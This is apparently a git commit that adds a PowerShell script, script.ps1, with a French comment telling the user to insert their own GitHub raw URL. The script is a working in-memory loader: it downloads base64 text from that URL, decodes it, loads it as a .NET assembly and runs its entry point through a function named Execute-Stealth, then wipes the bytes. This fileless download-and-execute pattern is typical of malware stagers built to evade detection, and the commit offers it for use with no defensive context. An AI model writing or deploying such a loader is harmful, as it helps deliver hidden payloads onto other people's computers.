3727c4415d10112d675a59bc3bf312280dffdfd2
thegoatofapi <bestshopeu123@gmail.com>
2025-12-08 23:28:46 +0100

    premier envoi

---
+++ script.ps1
@@ -0,0 +1,48 @@
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+function Download-Base64 {
+    param (
+        [string]$url
+    )
+    $base64 = Invoke-RestMethod -Uri $url
+    return $base64
+}
+
+function Decode-Base64 {
+    param (
+        [string]$base64
+    )
+    $bytes = [Convert]::FromBase64String($base64)
+    return $bytes
+}
+
+function Execute-InMemory {
+    param (
+        [byte[]]$bytes
+    )
+
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -ne $null) {
+        $entryPoint.Invoke($null, @())
+    }
+}
+
+function Execute-Stealth {
+    param (
+        [string]$url
+    )
+
+    $base64 = Download-Base64 -url $url
+    $bytes = Decode-Base64 -base64 $base64
+    Execute-InMemory -bytes $bytes
+
+    [Array]::Clear($bytes, 0, $bytes.Length)
+}
+
+# REMPLACER PAR TON URL GITHUB
+$url = "https://raw.githubusercontent.com/TON_USERNAME/TON_REPO/refs/heads/main/file.txt"
+
+Execute-Stealth -url $url
+
